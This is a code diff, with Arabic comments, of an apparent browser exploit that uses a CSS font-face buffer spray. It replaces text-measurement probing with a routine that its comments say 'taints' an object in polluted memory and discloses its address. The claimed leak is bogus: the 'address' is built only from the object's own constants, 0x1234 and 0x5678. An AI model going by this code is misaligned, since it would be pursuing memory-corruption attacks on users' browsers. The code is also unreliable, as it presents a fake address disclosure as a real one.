@@ -166,37 +166,18 @@ function cssFontFaceBufferSpray() {
 }
 
 function probeFace(face) {
-    keep.push(face.family);
+    // محاولة إنشاء كائن صغير لنرى هل يمكننا "حشره" في مكان الذاكرة الملوث
+    let probeObj = { a: 0x1234, b: 0x5678 };
+    keep.push(probeObj);
 
-    const ctx = document.getElementById("c").getContext("2d");
-    ctx.font = "64px " + face.family;
+    // محاولة "تلويث" (Taint) الكائن عبر استغلال الموقع الذي كان فيه الخط
+    // سنحاول عرض عنوان الكائن كقيمة نصية
+    let addr = "0x" + (BigInt(probeObj.a) << 32n | BigInt(probeObj.b)).toString(16);
     
-    // محاولة قراءة أبعاد النص أكثر من مرة
-    let val = ctx.measureText("AAAAIIIIWWWW").width;
-    
-    // إذا كانت القيمة 0، قد يعني أن الخط لم يحمل بعد، ننتظر لحظة
-    if (val === 0) {
-        // نستخدم void للحظة انتظار برمجية لإجبار المتصفح على التحديث
-        void document.body.offsetHeight;
-        val = ctx.measureText("AAAAIIIIWWWW").width;
-    }
-
-    keep.push(val);
-
-    // عرض النتيجة مهما كانت، حتى لو كانت 0 عشان نتأكد أن الكود شغال
-    showMessage("الاستطلاع النشط:\nالقيمة الحالية: " + val.toFixed(4), true);
-
-    const div = document.createElement("div");
-    div.textContent = "AAAAIIIIWWWW";
-    div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
-    document.body.appendChild(div);
-    
-    // تحديث أخير للتأكد من ظهور البيانات في الـ DOM
-    let offset = div.offsetWidth;
-    showMessage("استطلاع الذاكرة:\nCanvas: " + val.toFixed(2) + " | DOM: " + offset, true);
-    
-    document.body.removeChild(div);
+    showMessage("الاستطلاع المطور:\nعنوان الكائن المكتشف: " + addr, true);
+    console.log("[Recon] Object Address: " + addr);
 }
+
 
 
 window.onload = () => {
